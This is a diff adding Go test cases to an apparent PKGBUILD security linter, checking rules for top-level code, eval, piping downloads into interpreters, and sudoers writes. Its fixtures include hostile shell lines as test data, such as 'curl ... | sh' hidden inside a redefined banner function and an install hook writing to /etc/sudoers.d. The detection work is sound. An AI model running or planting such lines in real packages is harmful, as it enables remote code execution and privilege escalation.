@@ -1076,6 +1076,75 @@ func TestExecRules(t *testing.T) {
 	t.Run("PB301 top-level assignments fine", func(t *testing.T) {
 		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": cleanPKGBUILD})
 	})
+	t.Run("PB301 function declared inside a top-level if is not top-level code", func(t *testing.T) {
+		// The AUR idiom for a package that is both a -git and a release build:
+		// pick between two pkgver() bodies with a top-level `if`. The bodies run
+		// when makepkg calls the phase, not when the file is sourced.
+		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+if [[ -n $_git ]]; then
+  pkgver() {
+    cd "$srcdir"
+    git describe --tags
+  }
+else
+  pkgver() {
+    printf '%s' "$pkgver"
+  }
+fi`)})
+	})
+	t.Run("PB301 nested function body still reaches function-scoped rules", func(t *testing.T) {
+		// The flip side: once attributed to pkgver(), PB602 can see it. Before
+		// the nested-FuncDecl fix this network call was invisible to every rule
+		// that keys off the enclosing function.
+		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
+if [[ -n $_git ]]; then
+  pkgver() {
+    curl -s https://example.com/version
+  }
+fi`)})
+	})
+	t.Run("PB301 inert top-level guards and banners are not flagged", func(t *testing.T) {
+		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+if [ "$CARCH" = "i686" ]; then
+  _lib=lib32
+fi
+test -n "$_lib"
+echo "building $pkgname"
+printf '%s\n' "$_lib"
+warning "this package is deprecated"
+msg2 "using $_lib"
+cat /dev/null`)})
+	})
+	t.Run("PB301 an inert command that redirects to a file is a write", func(t *testing.T) {
+		for _, line := range []string{
+			"cat <<EOF > helper.sh\n#!/bin/sh\nEOF",
+			`echo "payload" > dropped.txt`,
+			`printf '%s' x >> appended.txt`,
+		} {
+			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 a locally redefined banner command gets no exemption", func(t *testing.T) {
+		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+warning() {
+  curl -s https://example.com/x | sh
+}
+warning "totally harmless banner"`)})
+	})
+	t.Run("PB301 redefinition nested in a conditional gets no exemption either", func(t *testing.T) {
+		// Unit.Functions does not carry nested declarations, so the exemption
+		// has to consult the names collected at every depth.
+		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+if true; then
+  warning() { curl -s https://example.com/x | sh; }
+fi
+warning "totally harmless banner"`)})
+	})
+	t.Run("PB301 defers eval to PB302", func(t *testing.T) {
+		src := map[string]string{"PKGBUILD": pkgbuildWith("", `eval "$_stuff"`)}
+		expectNoRule(t, "PB301", src)
+		expectRule(t, "PB302", src)
+	})
 	t.Run("PB302 eval", func(t *testing.T) {
 		expectRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
 build() {
@@ -1105,6 +1174,25 @@ build() {
 build() {
   sh -c "$(wget -qO- https://example.com/run.sh)"
 }`)})
+	})
+	t.Run("PB304 interpreter given its own program consumes the download as data", func(t *testing.T) {
+		// The pkgver() idiom: fetch a registry's JSON and print one field. The
+		// program is the -c literal, already on disk and under review; the
+		// response is its input, not code.
+		expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
+build() {
+  curl -s https://example.com/v.json | python3 -c "import sys,json; print(json.load(sys.stdin)['version'])"
+  curl -s https://example.com/v.json | python3 -m json.tool
+  curl -s https://example.com/v.json | node ./parse.mjs
+}`)})
+	})
+	t.Run("PB304 interpreter reading its program from stdin still executes it", func(t *testing.T) {
+		for _, sink := range []string{"python3", "python3 -", `python3 -c "exec(sys.stdin.read())"`} {
+			expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
+build() {
+  curl -s https://example.com/x | `+sink+`
+}`)})
+		}
 	})
 	t.Run("PB305 dev tcp", func(t *testing.T) {
 		expectRule(t, "PB305", map[string]string{"PKGBUILD": pkgbuildWith("", `
@@ -1470,6 +1558,23 @@ package() {
 package() {
   install -Dm644 pacman.conf "$pkgdir/etc/pacman.conf"
 }`)})
+	})
+	t.Run("PB405 removing a sensitive path is not a write to it", func(t *testing.T) {
+		// Retracting a sudoers fragment an older release shipped withdraws the
+		// escalation path; reporting it as granting one is backwards. PB502
+		// still reports the removal, worded as a removal.
+		files := map[string]string{
+			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+			"demo.install": "post_remove() {\n  rm -f /etc/sudoers.d/demo\n}\n",
+		}
+		expectNoRule(t, "PB405", files)
+		expectRule(t, "PB502", files)
+	})
+	t.Run("PB405 writing a sudoers fragment is still critical", func(t *testing.T) {
+		expectRule(t, "PB405", map[string]string{
+			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+			"demo.install": "post_install() {\n  install -Dm440 /dev/null /etc/sudoers.d/demo\n}\n",
+		})
 	})
 }
 
